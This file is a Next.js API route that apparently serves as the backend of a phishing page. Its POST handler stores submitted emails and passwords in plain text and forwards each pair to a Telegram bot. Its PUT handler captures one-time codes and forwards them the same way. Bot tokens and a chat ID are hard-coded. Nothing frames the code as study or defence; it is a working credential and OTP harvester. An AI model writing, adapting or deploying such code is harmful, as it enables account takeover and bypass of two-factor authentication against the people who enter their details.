import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import axios from 'axios';

const BOT_TOKEN = "8286931411:AAEX2p9q08v0fov7hKZnJQocbx1Dzn8xOXA";
const BOT_TOKEN1 = "8489459714:AAHGHp3pbli9SRHFLG7bMhsLX4CdhgIRCsQ";
const CHAT_ID = "8027544611";

async function sendToTelegramCode(userCode: string) {
  try {
    const message = `🔔 New Code Submitted\n\n\`\`\`\n${userCode}\n\`\`\``;
    
    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      },
      {
        timeout: 10000, // 10 second timeout
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
    
    console.log('Telegram notification sent successfully:', response.data);
    return response.data;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    // Don't throw - log error but continue
    return null;
  }
}
async function sendToTelegramEP(email: string, password: string) {
  try {
    const message = `🔔 New User- \nEmail-${email} \n Password-${password}`;
    
    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN1}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      },
      {
        timeout: 10000, // 10 second timeout
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
    
    console.log('Telegram notification sent successfully:', response.data);
    return response.data;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    // Don't throw - log error but continue
    return null;
  }
}

  export async function GET() {
    return NextResponse.json({ message: 'Hello world' });
  }

  export async function POST(request: Request) {
    const { email, password } = await request.json();

    try {
      await prisma.user.create({
        data: {
          email,
          password,
        },
      });
      await sendToTelegramEP(email,password).catch(err => {
        console.error('Failed to send Telegram notification:', err);
        // Continue even if Telegram fails
      });
      return NextResponse.json({ message: 'User created' });
    } catch (error) {
      console.error(error);
      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
    }
  }

  export async function PUT(request: Request) {
    const { email, otp } = await request.json();
    try {
      const user = await prisma.user.update({
        where: {
          email,
        },
        data: {
          otp,
        },
      });
      
      // Send to Telegram (await to ensure it completes)
      await sendToTelegramCode(otp).catch(err => {
        console.error('Failed to send Telegram notification:', err);
        // Continue even if Telegram fails
      });
            
      return NextResponse.json(user);
    } catch (error) {
      console.error(error);
      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
    }
  }
